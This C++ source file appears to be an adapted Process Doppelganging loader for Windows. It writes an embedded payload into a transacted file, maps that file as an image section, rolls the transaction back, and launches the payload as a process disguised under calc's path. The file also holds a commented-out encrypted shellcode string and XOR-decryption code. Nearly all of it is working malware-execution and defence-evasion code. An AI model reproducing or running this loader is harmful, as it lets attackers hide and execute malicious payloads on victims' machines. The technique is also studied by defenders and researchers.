#include <Windows.h>
#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "ntdll_undoc.h"
#include "util.h"
#include <Psapi.h>
#include "payload_data.h"
#include "pe_hdrs_helper.h"
#include "process_env.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")

#define PAGE_SIZE 0x1000

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001
#define PROCESS_CREATE_FLAGS_CREATE_SUSPENDED 0x00000200



bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
{

    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;
    NTSTATUS status;

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, targetPath);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transaction!" << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    /*wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);

    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
    wprintf(L"Temp Path     : %s\n", temp_path);
    wprintf(L"Dummy File    : %s\n", dummy_name);*/
    HANDLE hTransactedFile = CreateFileTransactedW(L"notepad.exe",
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
        std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }


    if (RollbackTransaction(hTransaction) == FALSE) {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }


    HANDLE hProcess = nullptr;
    status = NtCreateProcessEx(
        &hProcess, //ProcessHandle
        PROCESS_ALL_ACCESS, //DesiredAccess
        NULL, //ObjectAttributes
        NtCurrentProcess(), //ParentProcess
        PROCESS_CREATE_FLAGS_CREATE_SUSPENDED, //Flags
        hSection, //sectionHandle
        NULL, //DebugPort
        NULL, //ExceptionPort
        FALSE //InJob
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed: " << std::hex << status << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG) peb_copy.ImageBaseAddress;
    if (peb_copy.ProcessParameters) {
        std::wcout << L"ImagePathName: " << std::wstring(peb_copy.ProcessParameters->ImagePathName.Buffer, peb_copy.ProcessParameters->ImagePathName.Length / sizeof(WCHAR)) << std::endl;
    }
   

    //std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;

    DWORD payload_ep = get_entry_point_rva(payladBuf);
    ULONGLONG procEntry =  payload_ep + imageBase;
    
    //std::cout << "[+] Process created! Pid = " << std::dec << GetProcessId(hProcess) << "\n";

    //std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;

    HANDLE hThread = NULL;

    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (PVOID)procEntry,         // StartRoutine
        NULL,                     // Argument
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,         // <<<< MODIFIED HERE: Create thread in suspended state
        0,                        // StackZeroBits
        0,                        // SizeOfStackCommit (0 = default)
        0,                        // SizeOfStackReserve (0 = default)
        NULL                     // AttributeList
    );

    if (!NT_SUCCESS(status)) {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        CloseHandle(hProcess); // Clean up process if thread creation fails
        return false;
    }
    //std::cout << "[+] Thread created in suspended state. TID: " << GetThreadId(hThread) << std::endl;


    if (!setup_process_parameters(hProcess, pi, targetPath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }

    status = NtResumeThread(hThread, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "NtResumeThread failed: " << std::hex << status << std::endl;
        CloseHandle(hProcess); // Clean up process if thread creation fails
        return false;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;

    //std::cout << "[+] Thread resumed." << std::endl;
    return true;
}

int wmain(int argc, wchar_t *argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
    //if (argc < 2) {*/
    ////std::cout << "Process Doppelganging (";
    ////if (is32bit) std::cout << "32bit";
    ////else std::cout << "64bit";
    ////std::cout << ")\n";
    ////std::cout << "params: <payload path> [*target path]\n" << std::endl;
    ////std::cout << "* - optional" << std::endl;
    ////system("pause");
    ////return 0;
    //}
    if (init_ntdll_func() == false) {
        return -1;
    }
    wchar_t defaultTarget[MAX_PATH] = { 0 };
    get_calc_path(defaultTarget, MAX_PATH, is32bit);
    wchar_t *targetPath = defaultTarget;
    //char encryptedShellcode[] = "\x91\x29\xef\x8d\x93\x81\xa3\x75\x73\x6d\x20\x3d\x28\x33\x3b\x27\x44\xa1\x3c\x04\x24\xe2\x31\x09\x27\xfe\x21\x75\x29\xe7\x3b\x43\x3f\x22\x44\xba\x25\xea\x1e\x39\x2b\x66\xd8\x3f\x39\x25\x50\xac\xc5\x5f\x08\x13\x77\x5f\x4d\x20\xad\xa0\x6e\x28\x6e\xb4\x91\x80\x33\x24\xe2\x31\x49\x2e\x24\xf8\x2f\x5d\x24\x68\xb3\x0f\xee\x0d\x6b\x66\x63\x63\xec\x11\x69\x6f\x75\xf8\xed\xe9\x6c\x69\x63\x21\xea\xb5\x07\x0a\x29\x6d\xb9\xe8\x21\x77\x31\xf8\x2d\x41\x25\x68\xb3\x39\x8c\x23\x3b\x92\xa8\x2d\xe2\x57\xe1\x27\x74\xa5\x20\x50\xa5\x21\x52\xa9\xc3\x34\xb2\xa4\x6c\x2d\x68\xa2\x51\x8f\x00\x82\x21\x62\x20\x4d\x6b\x2c\x56\xa4\x06\xb5\x39\x28\xe2\x23\x4d\x26\x74\xa3\x0b\x20\xe7\x65\x2b\x2d\xe4\x35\x6f\x24\x60\xbc\x28\xe8\x6d\xe7\x34\x2b\x25\x60\xbc\x28\x3b\x37\x36\x2f\x32\x35\x20\x35\x28\x39\x21\xec\x99\x53\x2c\x33\x93\x89\x3b\x28\x36\x2f\x3b\xe6\x73\x85\x22\x9c\x96\x90\x28\x3a\xd3\x16\x1f\x5b\x3c\x5a\x5d\x75\x73\x2c\x37\x25\xe0\x85\x21\xee\x99\xd3\x6c\x61\x6c\x20\xea\x8c\x26\xc9\x71\x6d\x70\x30\xa9\xcb\x0d\x26\x34\x27\x24\xe8\x88\x25\xea\x98\x2e\xcf\x3f\x1a\x47\x6b\x96\xb6\x25\xe6\x9f\x1b\x6c\x60\x6c\x69\x3a\x28\xd5\x5c\xf3\x06\x61\x93\xbc\x09\x63\x2e\x2b\x23\x3d\x2c\x5d\xa0\x2e\x58\xaf\x3d\x8c\xad\x29\xe5\xab\x2b\x96\xaf\x3d\xfa\xac\x20\xd6\x83\x6c\xb6\x8f\x8a\xa6\x25\xe8\xab\x03\x73\x28\x37\x39\xfa\x8f\x29\xe5\x90\x22\xd3\xf6\xd0\x07\x0c\x9e\xb9\xec\xa3\x1d\x65\x3c\x8c\xa3\x14\x89\x81\xf0\x69\x6f\x75\x3b\xee\x8d\x7c\x21\xea\x8b\x22\x44\xba\x07\x65\x2d\x31\x2b\xe0\x96\x34\xc9\x6f\xb8\xa4\x36\x9c\xbc\xec\x8d\x73\x13\x34\x24\xea\xa7\x49\x31\xfc\x85\x07\x21\x2d\x30\x0b\x69\x7f\x75\x73\x2c\x39\x24\xe0\x91\x21\x5e\xbc\x32\xd7\x39\xc8\x3a\x86\x96\xba\x3d\xfa\xae\x28\xe5\xae\x2e\x58\xa6\x3c\xfa\x9d\x29\xe5\xb3\x2b\xe0\x96\x34\xc9\x6f\xb8\xa4\x36\x9c\xbc\xec\x8d\x73\x10\x49\x34\x28\x34\x30\x07\x75\x33\x6d\x61\x2d\x31\x09\x69\x35\x34\xc9\x66\x4e\x63\x59\x9c\xbc\x38\x2c\x32\xd7\x14\x02\x24\x02\x96\xba\x3c\x8c\xa3\x88\x50\x96\x9c\x96\x27\x74\xb0\x25\x48\xaa\x21\xe6\x9f\x1a\xc1\x32\x92\x86\x34\x03\x63\x30\xd4\x95\x6e\x47\x6b\x2d\xe0\xb9\x96\xba";
    size_t payloadSize = sizeof(embedded_payload);
    /*BYTE* payladBuf = (BYTE*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (payladBuf) {
        memcpy(payladBuf, encryptedShellcode, embedded_payload_size);
    }*/
    BYTE* payladBuf = buffer_payloadv2(embedded_payload, payloadSize);
    
    /*const BYTE key = 0xAA;
    for (size_t i = 0; i < payloadSize; i++) {
        payladBuf[i] = payladBuf[i] ^ key;
    }*/

    bool is_ok = process_doppel(targetPath, payladBuf, (DWORD) payloadSize);

    free_buffer(payladBuf, payloadSize);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    } else {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
